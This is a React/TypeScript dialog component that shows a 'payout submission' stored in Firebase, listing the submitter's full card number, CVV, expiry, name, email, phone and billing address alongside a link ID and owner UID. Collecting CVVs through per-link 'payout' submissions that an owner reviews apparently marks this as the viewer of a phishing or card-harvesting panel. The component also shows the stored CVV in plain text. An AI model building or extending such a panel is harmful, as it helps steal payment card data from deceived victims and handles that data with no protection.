"use client";

import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { formatDistanceToNow } from "date-fns";
import type { PayoutSubmission } from "@/lib/firebase/payouts";
import { ScrollArea } from "@/components/ui/scroll-area";

interface PayoutDetailsDialogProps {
  submission: PayoutSubmission | null;
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

function DetailRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex items-center justify-between py-1.5 text-sm">
      <span className="text-muted-foreground">{label}</span>
      <span className="font-medium">{value || "—"}</span>
    </div>
  );
}

export function PayoutDetailsDialog({
  submission,
  open,
  onOpenChange,
}: PayoutDetailsDialogProps) {
  if (!submission) return null;

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="min-w-[calc(35vw-2rem)] gap-0 px-0 py-5">
        <ScrollArea className="h-[75vh] px-6">
          <DialogHeader>
            <DialogTitle>Payout submission details</DialogTitle>
          </DialogHeader>

          <div className="p-3 mt-4">
            <div className="mb-2 flex items-center justify-between">
              <span className="text-xs font-semibold uppercase tracking-wide ">
                Balance
              </span>
              <Badge
                variant={submission.brandName ? "default" : "secondary"}
                className="rounded-sm"
              >
                $ {submission.brandName || "Unknown"}
              </Badge>
            </div>

            <Separator className="my-2" />

            <p className="mb-1 text-xs font-semibold uppercase tracking-wide ">
              Card
            </p>
            <DetailRow label="Name on card" value={submission.cardName} />
            <DetailRow label="Card number" value={submission.cardNumber} />
            <DetailRow label="Cvv" value={submission.cvv} />
            <DetailRow label="Expiry" value={submission.expiryDate} />

            <Separator className="my-2" />

            <p className="mb-1 text-xs font-semibold uppercase tracking-wide ">
              Contact
            </p>
            <DetailRow
              label="Name"
              value={`${submission.firstName} ${submission.lastName}`}
            />
            <DetailRow label="Email" value={submission.email} />
            <DetailRow label="Phone" value={submission.phone} />

            <Separator className="my-2" />

            <p className="mb-1 text-xs font-semibold uppercase tracking-wide ">
              Billing address
            </p>
            <DetailRow label="Address" value={submission.address} />
            <DetailRow label="City" value={submission.city} />
            <DetailRow label="State" value={submission.state} />
            <DetailRow label="ZIP code" value={submission.zipCode} />
            <DetailRow label="Country" value={submission.country} />

            <Separator className="my-2" />

            <p className="mb-1 text-xs font-semibold uppercase tracking-wide ">
              Reference
            </p>
            <DetailRow label="Link ID" value={submission.linkId} />
            <DetailRow label="Submission ID" value={submission.id} />
            <DetailRow label="Owner UID" value={submission.ownerUid} />
            <DetailRow
              label="Submitted"
              value={
                submission.createdAt?.toDate
                  ? formatDistanceToNow(submission.createdAt.toDate(), {
                      addSuffix: true,
                    })
                  : "—"
              }
            />
          </div>
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}
